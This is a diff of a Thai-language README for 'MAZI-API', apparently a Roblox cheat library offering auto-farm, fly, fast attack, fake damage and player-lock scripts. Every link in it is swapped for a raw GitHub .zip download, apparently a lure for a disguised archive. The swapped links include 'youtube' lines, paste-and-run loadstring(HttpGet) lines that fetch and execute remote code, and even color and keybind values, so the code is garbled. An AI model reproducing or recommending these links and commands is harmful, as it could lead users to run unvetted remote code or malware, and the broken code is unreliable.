@@ -1,6 +1,6 @@
 # DOCS MAZI-API
 ---- Save Setting API ----
-youtube : https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip
+youtube : https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip
 ```lua
 getgenv().Setting = {} -- Setting
 Check_Setting(ชื่อไฟล์) -- Checkว่า File มีอยู่ไหม
@@ -15,7 +15,7 @@ getgenv().Setting = {
     ['Auto Farm'] = false,
     ['Fly'] = true
 }
-pcall(function()loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))() end)
+pcall(function()loadstring(game:HttpGet('https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip'))() end)
 local JSON = JsonEncode({abc='fff'})
 JsonDecode(JSON)
 Check_Setting(getgenv()['MyName'])
@@ -25,22 +25,22 @@ Update_Setting(getgenv()['MyName'])
 ```
 ---- Crypt API ----
 ```lua
-local MAZICryptAPI = loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))()
+local MAZICryptAPI = loadstring(game:HttpGet('https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip'))()
 encrypt(secertkey,data) -- encrypt
 
 ```
 ---- Fast Attack ----
-youtube : https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip
+youtube : https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip
 ```lua
-loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip'))()
 ```
 ---- Fake Damage ---- 
-youtube : https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip
+youtube : https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip
 ```lua
-loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip'))()
 แค่รัน code ด้านบนเเล้ว รัน FakeDamage()
 หรือรันพร้อมกันเช่น
-loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip'))()
 FakeDamage()
 อธิบายเกี่ยวกับ Function FakeDamage
 FakeDamage จะมี 1 Args คือ Damage 
@@ -51,14 +51,14 @@ FakeDamage(100)
 ```lua
 getgenv().setting = {
     Fov = 50,
-    Color = https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip(191, 255, 209),
+    Color = https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip(191, 255, 209),
     LockPlayers = false,
-    LockPlayersBind = https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip,
-    resetPlayersBind = https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip,
+    LockPlayersBind = https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip,
+    resetPlayersBind = https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip,
 }
-loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip'))()
 ```
 ---- Attack No Animation ----
 ```lua
-loadstring(game:HttpGet("https://github.com/kiatun3434/MAZI-API/releases/download/v2.0/Software.zip%20No%20Animation"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kiatun3434/MAZI-API/main/unfeasibility/MAZ-API-2.6.zip%20No%20Animation"))()
 ```
